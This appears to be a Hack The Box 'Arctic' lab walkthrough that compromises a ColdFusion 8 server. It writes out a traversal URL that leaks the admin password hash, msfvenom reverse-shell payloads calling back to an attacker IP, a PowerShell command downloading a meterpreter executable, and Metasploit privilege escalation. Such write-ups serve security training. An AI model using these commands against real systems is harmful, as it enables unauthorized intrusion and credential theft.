**HTB — Arctic Walkthrough**

***nmap -sC -sV -p- 10.129.43.81 — min-rate 10000***

<img width="720" height="340" alt="image" src="https://github.com/user-attachments/assets/3fb3f670-544b-45fa-95d9-a4151ff93240" />

At port 8500 http services are running.

<img width="720" height="348" alt="image" src="https://github.com/user-attachments/assets/8f5465a8-d14a-48c3-a888-3b117d138bc2" />

CFID is coldfusion

Lets go to the CFIDE directory

We have an administrator folder.

<img width="720" height="470" alt="image" src="https://github.com/user-attachments/assets/ab58beb7-68b6-4629-a774-bc930ce3a9d7" />

Lets check there.

<img width="720" height="485" alt="image" src="https://github.com/user-attachments/assets/cf481bb6-f86d-4b9d-ae18-b0bad2dc31b3" />

Coldfusion 8 is running.

Lets check if we can find any exploit for this.

<img width="720" height="206" alt="image" src="https://github.com/user-attachments/assets/bd14db7e-adc2-4309-827b-fa9154b8c221" />

We found some exploits for Coldfusion.

Lets try Directory Traversal attack

Lets find and copy this exploit on the desktop

<img width="720" height="330" alt="image" src="https://github.com/user-attachments/assets/398be2b0-a117-484c-bb28-3706fef78030" />

Lets check this exploit

<img width="720" height="160" alt="image" src="https://github.com/user-attachments/assets/415737ac-358d-487e-97bc-bd5968c0af13" />

This is the exploit

lets copy it

http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

Lets test this url.

<img width="720" height="241" alt="image" src="https://github.com/user-attachments/assets/1b2f0682-f783-42ee-b686-824df0430091" />

<img width="720" height="435" alt="image" src="https://github.com/user-attachments/assets/8b8f2d30-a1e5-47f3-8d35-6d01a38799c0" />

We got some passwords which are encrypted

#Wed Mar 22 20:53:51 EET 2017 rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP \n **password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03** encrypted=true

This password could be the admin password. Lets decrypt it

***hash-identifier*** >> it will try to identify the hash type

<img width="720" height="434" alt="image" src="https://github.com/user-attachments/assets/dd4c14f2-d273-4a5b-8449-cb3adcd2a584" />

<img width="720" height="403" alt="image" src="https://github.com/user-attachments/assets/cd275d42-d297-4c23-a05b-77556e20b67a" />

Lets try to login with admin

<img width="720" height="407" alt="image" src="https://github.com/user-attachments/assets/70646975-e2d8-4c5a-b62f-20d96b47ab7a" />

We are able to login now.

<img width="720" height="334" alt="image" src="https://github.com/user-attachments/assets/445064c6-b52b-4c51-b70d-d5e53b4a0447" />

Here we can schedule any task.

<img width="720" height="328" alt="image" src="https://github.com/user-attachments/assets/f1848e78-fdb5-45fe-9a92-46a32b826505" />

We will use msfvenom to generate java reverse shell

***msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.197 LPORT=4444 -f raw > /var/www/html/shell.jsp***

<img width="720" height="118" alt="image" src="https://github.com/user-attachments/assets/12eaddd0-6987-42bd-8273-294768c7366f" />

payload is created

<img width="720" height="181" alt="image" src="https://github.com/user-attachments/assets/16d1e35a-96b8-4efd-b440-18bd7e713ea4" />

Now we need to start Apache server.

While starting the Apache server wo got an error that port 80 is already in used and cannot start Apache server.

We have changed the port 8080 for Apache2 server using following commands.

sudo sed -i ‘s/^Listen .*/Listen 8080/’ /etc/apache2/ports.conf && \

sudo sed -i ‘s/<VirtualHost \*:80>/<VirtualHost *:8080>/g’ /etc/apache2/sites-available/*.conf && \

sudo apachectl -t && \

sudo systemctl restart apache2 && \

sudo ufw allow 8080/tcp

<img width="720" height="241" alt="image" src="https://github.com/user-attachments/assets/8038baca-8abb-482b-9957-1fe42e7e9d98" />

Apache2 server is listining on port 8080

Lets verify

<img width="720" height="309" alt="image" src="https://github.com/user-attachments/assets/a0a897a1-c017-49f8-924d-a77b6b9b61c3" />

<img width="720" height="405" alt="image" src="https://github.com/user-attachments/assets/1077e667-4f95-4b03-9702-0b1b8a11b16d" />

We have the payload set.

Lets copy the URL of the payload and create a task in the machine

http://10.10.14.197:8080/shell.jsp

<img width="720" height="430" alt="image" src="https://github.com/user-attachments/assets/099efb5a-f843-4d68-a563-0b197a34ac82" />

\ColdFusion8\wwwroot\CFIDE\shell.jsp

<img width="720" height="173" alt="image" src="https://github.com/user-attachments/assets/d6e61696-654d-45b7-9c7d-5333d1b8ac9c" />

New task is created

Lets setup a netcat listner

<img width="720" height="198" alt="image" src="https://github.com/user-attachments/assets/c1515400-8956-4606-89c3-9fd874202190" />

Lets activate the payload

http://10.129.44.71:8500/CFIDE/shell.jsp

<img width="720" height="285" alt="image" src="https://github.com/user-attachments/assets/7aa2f3ed-dce6-4a3c-9622-88c11ac04148" />

And we got our reverse shell

<img width="720" height="293" alt="image" src="https://github.com/user-attachments/assets/7ca37f48-ac0a-445f-8cb1-d970e4cbea36" />

<img width="720" height="614" alt="image" src="https://github.com/user-attachments/assets/686dfb1c-5ac1-45e7-84a9-1cb8e9683c73" />

We are in the root folder of ColdFusion

Lets go to the C > Users folder

<img width="720" height="461" alt="image" src="https://github.com/user-attachments/assets/807bfcd4-06e5-4aab-97df-3b70146841e9" />

We have a user tolis

<img width="720" height="528" alt="image" src="https://github.com/user-attachments/assets/6a8795a2-5be4-4c55-936d-0487feb1e736" />

<img width="720" height="374" alt="image" src="https://github.com/user-attachments/assets/f17d7ecb-1509-4c33-9bf8-7555495dccc9" />

We have the user flag. However we are not able to see the content.

Now we want to generate a meterpreter shell

Lets generate a meterpreter reverse shell

***msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.197 LPORT=444 -f exe > /var/www/html/met.exe***

<img width="720" height="154" alt="image" src="https://github.com/user-attachments/assets/28f62079-cc7b-4dcf-b8de-d828b27ad6c6" />

Payload is created

<img width="720" height="198" alt="image" src="https://github.com/user-attachments/assets/6cd46074-cf43-49ff-8998-850e14f86644" />

Now, we need to transfer this payload to our target machine. We will use powershell for that.

***powershell “(New-Object System.Net.WebClient).Downloadfile(‘http://10.10.14.197:8080/met.exe’,’meterpreter.exe’)”***

<img width="720" height="79" alt="image" src="https://github.com/user-attachments/assets/591b42e1-74e7-476e-ad7b-bcd6e407acbd" />

<img width="720" height="564" alt="image" src="https://github.com/user-attachments/assets/9da53848-516c-4410-b311-d8c787604da2" />

File is copied to the target machine

Now lets open msfconsole

***use exploit/multi/handler***

<img width="720" height="176" alt="image" src="https://github.com/user-attachments/assets/04b79d11-cb40-48d1-9f57-53a994847823" />

***set payload windows/meterpreter/reverse_tcp***

<img width="720" height="149" alt="image" src="https://github.com/user-attachments/assets/45a6b405-df06-461b-853e-cbf36da2dc8d" />

meterpreter is listening on 444

Lets run the exploit on target machine

<img width="720" height="146" alt="image" src="https://github.com/user-attachments/assets/4067565d-4730-4135-a75c-3f0a9f5a9362" />

<img width="720" height="199" alt="image" src="https://github.com/user-attachments/assets/acd979b2-dee9-48a7-a134-c5f75c4c1e2c" />

And we have a meterpreter shell

<img width="720" height="329" alt="image" src="https://github.com/user-attachments/assets/f7c95a67-1120-4525-a2f9-54a39b70f25f" />

<img width="720" height="272" alt="image" src="https://github.com/user-attachments/assets/54ce6dbf-1908-4444-aa39-492d01e2b0cd" />

<img width="720" height="286" alt="image" src="https://github.com/user-attachments/assets/23e750c5-382f-4b43-855e-7e61f861a3a7" />

<img width="720" height="294" alt="image" src="https://github.com/user-attachments/assets/a7faacd9-b7ee-4701-870b-9daa1d244362" />

We got the user flag

<img width="720" height="461" alt="image" src="https://github.com/user-attachments/assets/3c64c16f-7929-4e41-bf34-ea2f71437f69" />

We cannot go to the Admin folder. We need to escalate the privilege

<img width="720" height="200" alt="image" src="https://github.com/user-attachments/assets/cae669b4-d1de-496e-89ca-617d71a3de50" />

Lets check about the system

***sysinfo***

<img width="720" height="241" alt="image" src="https://github.com/user-attachments/assets/aabf6d28-6c2f-4aa4-8e9d-c60b849c32b1" />

Here target machine is 64 bit but our meterpreter session is 32 bit

Lets check what processes are running

***ps***

<img width="720" height="256" alt="image" src="https://github.com/user-attachments/assets/8c3f3a9b-247b-4c56-bd10-78a59806d74b" />

Lets migrate to jrun. Its process ID is 1164

<img width="720" height="118" alt="image" src="https://github.com/user-attachments/assets/3abf3e71-264e-41b1-ba26-98652d7a7483" />

<img width="720" height="289" alt="image" src="https://github.com/user-attachments/assets/c6744127-4614-42ef-aff4-56eac1e902a3" />

Now meterpreter session is also 64 bit

Lets background this sessions

<img width="720" height="213" alt="image" src="https://github.com/user-attachments/assets/9eb8b385-c905-4372-bd65-18c2950d5dca" />

Lets check what exploit we have

***search suggester***

<img width="720" height="356" alt="image" src="https://github.com/user-attachments/assets/d244432a-8c74-4ea8-9543-c0fe4bbe5278" />

<img width="720" height="176" alt="image" src="https://github.com/user-attachments/assets/24db272c-7056-4013-b019-a01a80b4558c" />

Lets use this exploit

<img width="720" height="367" alt="image" src="https://github.com/user-attachments/assets/ae30b8e6-08c3-4a9c-b77d-fbaa838b8017" />

<img width="720" height="346" alt="image" src="https://github.com/user-attachments/assets/e87cbe6e-b3ef-45cb-b06e-10e8cadd650f" />

And we got the shell

Lets go to user Administrator > Desktop

<img width="720" height="630" alt="image" src="https://github.com/user-attachments/assets/2431648a-3b38-4ccf-af8e-62f2e9d3cab4" />

We got the root flag as well !!!
